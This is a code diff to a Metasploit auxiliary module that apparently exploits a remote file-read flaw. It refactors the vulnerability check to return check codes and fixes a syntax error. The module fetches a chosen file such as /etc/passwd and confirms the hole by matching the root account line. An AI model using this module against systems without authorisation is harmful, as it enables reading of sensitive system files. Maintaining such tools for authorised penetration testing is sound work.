@@ -59,8 +59,8 @@ class MetasploitModule < Msf::Auxiliary
     return true if datastore['SkipCheck']
     # Check if target file is absolute path
     unless datastore['TARGET_FILE'].start_with? '/'
-      print_error "TARGET_FILE must be an absolute path (eg. /etc/passwd)."
-      return false
+      vprint_error "TARGET_FILE must be an absolute path (eg. /etc/passwd)."
+      return Exploit::CheckCode::Unknown
     end
 
     # Fire off the request
@@ -71,26 +71,25 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if res.nil?
-      print_error "Request timed out."
-      return false
+      vprint_error "Request timed out."
+      return Exploit::CheckCode::Unknown
     end
 
     if res.body.include? 'root:x:0:0:root:'
-      print_good 'Target is vulnerable!'
-      return true
+      return Exploit::CheckCode::Vulnerable
     else
-      print_error 'Target is not vulnerable. Make sure your route is correct.'
-      return false
+      vprint_error 'Target is not vulnerable. Make sure your route is correct.'
+      return Exploit::CheckCode::Unknown
     end
   end
 
   def run
-    unless check
+    unless check == Exploit::CheckCode::Vulnerable
       print_error 'Check did not pass, exiting.'
       return
     end
 
-    fail_with(Failure::BadConfig, 'TARGET_FILE must be an absolute path (eg. /etc/passwd).') unless datastore['TARGET_FILE'].start_with? == '/'
+    fail_with(Failure::BadConfig, 'TARGET_FILE must be an absolute path (eg. /etc/passwd).') unless datastore['TARGET_FILE'].start_with? '/'
 
 
     print_status "Requesting file #{datastore['TARGET_FILE']}"
